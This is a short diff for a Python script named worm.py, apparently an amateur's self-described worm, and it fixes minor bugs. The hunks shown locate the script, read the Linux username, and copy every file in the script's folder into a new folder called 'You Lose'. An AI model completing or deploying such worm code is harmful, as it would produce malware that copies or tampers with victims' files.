@@ -53,7 +53,7 @@ def wiggle():
     #the computer is linux 
     if(system == "Linux"):
         #get the current location
-        currentpath = os.path.abspath("worm.py")
+        currentpath = os.path.abspath("worm.py") #im gonna ignore this for now <3
 
         #need the username to properly get pathway names
         username = os.getlogin()
@@ -107,7 +107,7 @@ def take():
     #the take method will create a file and send all the other files in that folder
 
     #get the current location
-    location = os.path.abspath(worm.py)
+    location = os.path.abspath("worm.py")
 
     #create the folder there??
     directory = 'You Lose'
@@ -122,7 +122,7 @@ def take():
     for filename in files:
         #want to make the files a full pathway to properly copy
         full_name = os.path.join(location, filename)
-        if os.isfile(full_name):
+        if os.path.isfile(full_name):
 
             #send all of those copies to a new file 
             shutil.copy(full_name, directory)
